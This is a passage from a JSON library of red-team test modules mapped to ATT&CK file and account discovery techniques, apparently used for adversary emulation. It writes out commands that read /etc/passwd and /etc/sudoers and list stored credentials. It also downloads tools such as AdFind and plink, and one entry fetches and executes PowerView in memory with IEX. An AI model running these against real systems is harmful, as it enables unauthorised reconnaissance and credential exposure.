          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\DirLister.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "DirLister.exe must exist in the specified path #{dirlister_path}\n",
          "check_command": "if (Test-Path \"#{dirlister_path}\") {exit 0} else {exit 1}\n",
          "install_command": "$parentpath = Split-Path \"#{dirlister_path}\"\nNew-Item -ItemType Directory -Force -Path $parentpath | Out-Null\nInvoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\\*\" \"$parentpath\" -Recurse\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4.zip\",\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\TDirLister.v2.beta4\" -Recurse -ErrorAction Ignore\n"
        }
      ],
      "rx_module_id": "c5bec457-43c9-4a18-9a24-fe151d8971b7",
      "module_name": "Launch DirLister Executable"
    },
    {
      "index": 561,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "An adversary uses the find command to enumerate vmdks on an ESXi host.\n[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "cli_script",
          "description": "Path to script with file discovery commands",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1083\\src\\esxi_file_discovery.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink is available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "4a233a40-caf7-4cf1-890a-c6331bbc72cf",
      "module_name": "ESXi - Enumerate VMDKs available on an ESXi Host"
    },
    {
      "index": 562,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "If the system uses network file systems (e.g., NFS, CIFS), findmnt can help locate paths to remote shares.\nAttackers may then attempt to access these shares for lateral movement or data exfiltration.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "findmnt -t nfs\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "361fe49d-0c19-46ec-a483-ccb92d38e88e",
      "module_name": "Identifying Network Shares - Linux"
    },
    {
      "index": 563,
      "technique_id": "T1083",
      "technique_name": "File and Directory Discovery",
      "description": "Adversary attempting to discover and collect sensitive documents and archives\nfrom a users system. The test recursively enumerates common user folders\n(Documents, Downloads, Desktop, OneDrive) for file types of interest such as .pdf, .doc,\n.docx, .xls, .xlsx, .txt, .zip, .rar, and .7z.\nThis behavior is similar to malware like LOSTKEYS used by COLDRIVER in January 2025,\nwhere attackers perform targeted file discovery to support strategic intelligence collection https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$out = \"#{output_file}\"\n$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')\n$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')\n$userProfile = [Environment]::GetFolderPath('UserProfile')\n$tr = [System.Collections.Generic.List[string]]::new()\n\nfunction MatchesExtension($path) {\n  try {\n    $e = [System.IO.Path]::GetExtension($path).ToLower()\n    return $exts -contains $e\n  } catch { return $false }\n}\n\nfunction Scan-Dir($root) {\n  try {\n    $match = $false\n    foreach ($f in $dirsFilter) { if ($root -like \"*$f*\") { $match = $true; break } }\n    if (-not $match) { return }\n\n    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {\n      if (MatchesExtension $_) {\n        $fi = [System.IO.FileInfo]::new($_)\n        $tr.Add(\"[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)\")\n      }\n    }\n\n    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {\n      Scan-Dir $_\n    }\n  } catch [System.UnauthorizedAccessException] {\n    $tr.Add(\"[AccessDenied] $root\")\n  } catch {\n    $tr.Add(\"[Error] $root => $($_.Exception.Message)\")\n  }\n}\n\n[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }\n\n# Ensure output dir exists\n$outDir = [System.IO.Path]::GetDirectoryName($out)\nif (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {\n  New-Item -Path $outDir -ItemType Directory -Force | Out-Null\n}\n\n# Write results\n$tr | Out-File -FilePath $out -Encoding UTF8\nWrite-Output \"Enumeration complete. Results written to: $out\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{output_file}\" -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to output results.",
          "type": "string",
          "default_value": "$env:TEMP\\T1083-Enumerate-net.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "95a21323-770d-434c-80cd-6f6fbf7af432",
      "module_name": "Recursive Enumerate Files And Directories By Powershell"
    },
    {
      "index": 564,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Enumerate all accounts by copying /etc/passwd to another file\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1087.001.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f8aab3dd-5990-4bf8-b8ab-2226c951696f",
      "module_name": "Enumerate all accounts (Local)"
    },
    {
      "index": 565,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "(requires root)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;\nif [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;\ncat #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1087.001.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fed9be70-0186-4bde-9f8a-20945f9370c2",
      "module_name": "View sudoers access"
    },
    {
      "index": 566,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "View accounts with UID 0\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file} 2>/dev/null\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1087.001.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c955a599-3653-4fe5-b631-f11c00eb0397",
      "module_name": "View accounts with UID 0"
    },
    {
      "index": 567,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "List opened files by user\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "username=$(id -u -n) && lsof -u $username\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "check if lsof exists\n",
          "check_command": "which lsof\n",
          "install_command": "(which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
        }
      ],
      "rx_module_id": "7e46c7a5-0142-45be-a858-1a3ecb4fd3cb",
      "module_name": "List opened files by user"
    },
    {
      "index": 568,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Show if a user account has ever logged in remotely\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > #{output_file}\ncat #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1087.001.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if lastlog command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v lastlog)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "sudo apt-get install login; exit 1;\n"
        }
      ],
      "rx_module_id": "0f0b6a29-08c3-44ad-a30b-47fd996b2110",
      "module_name": "Show if a user account has ever logged in remotely"
    },
    {
      "index": 569,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Utilize groups and id to enumerate users and groups\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "groups\nid\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e6f36545-dc1e-47f0-9f48-7f730f54a02e",
      "module_name": "Enumerate users and groups"
    },
    {
      "index": 570,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Utilize local utilities to enumerate users and groups\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "319e9f6c-7a9e-432e-8c62-9385c803b6f2",
      "module_name": "Enumerate users and groups"
    },
    {
      "index": 571,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "80887bec-5a9b-4efc-a81d-f83eb2eb32ab",
      "module_name": "Enumerate all accounts on Windows (Local)"
    },
    {
      "index": 572,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b",
      "module_name": "Enumerate all accounts via PowerShell (Local)"
    },
    {
      "index": 573,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "query user\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a138085e-bfe5-46ba-a242-74a6fb884af3",
      "module_name": "Enumerate logged on users via CMD (Local)"
    },
    {
      "index": 574,
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery: Local Account",
      "description": "An adversary can use ESXCLI to enumerate a list of all local accounts on an ESXi host.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#account%20enumeration)\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system account list\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if we have plink\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "9762ac6e-aa60-4449-a2f0-cbbd0e1fd22c",
      "module_name": "ESXi - Local Account Discovery via ESXCLI"
    },
    {
      "index": 575,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user /domain\nnet group /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e",
      "module_name": "Enumerate all accounts (Domain)"
    },
    {
      "index": 576,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8b8a6449-be98-4f42-afd2-dedddc7453b2",
      "module_name": "Enumerate all accounts via PowerShell (Domain)"
    },
    {
      "index": 577,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "query user /SERVER:#{computer_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Name of remote system to query",
          "type": "string",
          "default_value": "%COMPUTERNAME%"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "161dcd85-d014-4f5e-900c-d3eaae82a0f7",
      "module_name": "Enumerate logged on users via CMD (Domain)"
    },
    {
      "index": 578,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-Expression \"#{adrecon_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "Get-ChildItem \"PathToRagloxModulesFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n"
      },
      "variables": [
        {
          "name": "adrecon_path",
          "description": "Path of ADRecon.ps1 file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\ADRecon.ps1"
        }
      ],
      "prerequisites": [
        {
          "description": "ADRecon must exist on disk at specified location (#{adrecon_path})\n",
          "check_command": "if (Test-Path \"#{adrecon_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile \"#{adrecon_path}\"\n"
        }
      ],
      "rx_module_id": "95018438-454a-468c-a0fa-59c800149b59",
      "module_name": "Automated AD Recon (ADRecon)"
    },
    {
      "index": 579,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "736b4f53-f400-4c22-855d-1a6b5a551600",
      "module_name": "Adfind -Listing password policy"
    },
    {
      "index": 580,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "b95fd967-4e62-4109-b48d-265edfd28c3a",
      "module_name": "Adfind - Enumerate Active Directory Admins"
    },
    {
      "index": 581,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7",
      "module_name": "Adfind - Enumerate Active Directory User Objects"
    },
    {
      "index": 582,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "5e2938fb-f919-47b6-8b29-2f6a1f718e99",
      "module_name": "Adfind - Enumerate Active Directory Exchange AD Objects"
    },
    {
      "index": 583,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test will enumerate the details of the built-in domain admin account\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user administrator /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef",
      "module_name": "Enumerate Default Domain Admin Details (Domain)"
    },
    {
      "index": 584,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Domain FQDN",
          "type": "string",
          "default_value": "$env:UserDnsDomain"
        },
        {
          "name": "uac_prop",
          "description": "UAC Property to search",
          "type": "integer",
          "default_value": 524288
        }
      ],
      "prerequisites": [
        {
          "description": "PowerShell ActiveDirectory Module must be installed\n",
          "check_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
          "install_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
        }
      ],
      "rx_module_id": "46f8dbe9-22a5-4770-8513-66119c5be63b",
      "module_name": "Enumerate Active Directory for Unconstrained Delegation"
    },
    {
      "index": 585,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "93662494-5ed7-4454-a04c-8c8372808ac2",
      "module_name": "Get-DomainUser with PowerView"
    },
    {
      "index": 586,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "The following RAGLOX test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "02e8be5a-3065-4e54-8cc8-a14d138834d3",
      "module_name": "Enumerate Active Directory Users with ADSISearcher"
    },
    {
      "index": 587,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "The following RAGLOX test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7ab0205a-34e4-4a44-9b04-e1541d1a57be",
      "module_name": "Enumerate Linked Policies In ADSISearcher Discovery"
    },
    {
      "index": 588,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "The following RAGLOX test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
